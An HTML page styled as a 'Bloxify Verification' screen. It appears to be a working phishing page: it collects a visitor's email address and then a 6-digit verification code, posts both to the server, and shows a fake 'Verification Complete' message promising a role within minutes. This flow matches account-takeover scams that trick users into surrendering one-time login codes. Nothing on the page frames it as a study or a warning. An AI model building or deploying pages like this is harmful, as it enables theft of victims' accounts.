<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Bloxify Verification</title>

<style>
html, body {
    margin: 0;
    width: 100%;
    height: 100%;
    background: #000;
    font-family: Arial, sans-serif;
    overflow: hidden;
}

/* STATIC STAR BACKGROUND */
body::before {
    content: "";
    position: fixed;
    inset: 0;
    background-image:
        radial-gradient(#fff 1px, transparent 1px);
    background-size: 120px 120px;
    opacity: 0.25;
}

/* CARD */
#box {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 420px;
    padding: 35px;
    background: #111;
    border-radius: 14px;
    box-shadow: 0 0 40px rgba(0,0,0,.8);
    text-align: center;
}

h1 {
    color: #eee;
    margin-bottom: 8px;
}

p {
    color: #999;
    font-size: 14px;
}

input {
    width: 100%;
    padding: 14px;
    margin-top: 18px;
    font-size: 16px;
    border-radius: 8px;
    border: none;
    background: #1c1c1c;
    color: white;
}

button {
    width: 100%;
    padding: 14px;
    margin-top: 14px;
    font-size: 16px;
    border-radius: 8px;
    border: none;
    background: #2a2a2a;
    color: white;
    cursor: pointer;
}

button:hover {
    background: #3a3a3a;
}
</style>
</head>

<body>

<div id="box">
    <h1>Bloxify Verification</h1>
    <p id="desc">Enter your email to begin verification.</p>

    <input id="input" placeholder="Email address">
    <button onclick="submit()">Submit</button>
</div>

<script>
let step = "email";

function submit() {
    const value = input.value.trim();
    if (!value) return;

    if (step === "email") {
        fetch("/email", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ email: value })
        });

        input.value = "";
        input.placeholder = "6-digit code";
        desc.innerText = "Enter the verification code.";
        step = "code";

    } else {
        fetch("/code", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ code: value })
        });

        box.innerHTML = `
            <h1>Verification Complete</h1>
            <p>Please wait 5â€“10 minutes to receive your role.</p>
        `;
    }
}
</script>

</body>
</html>
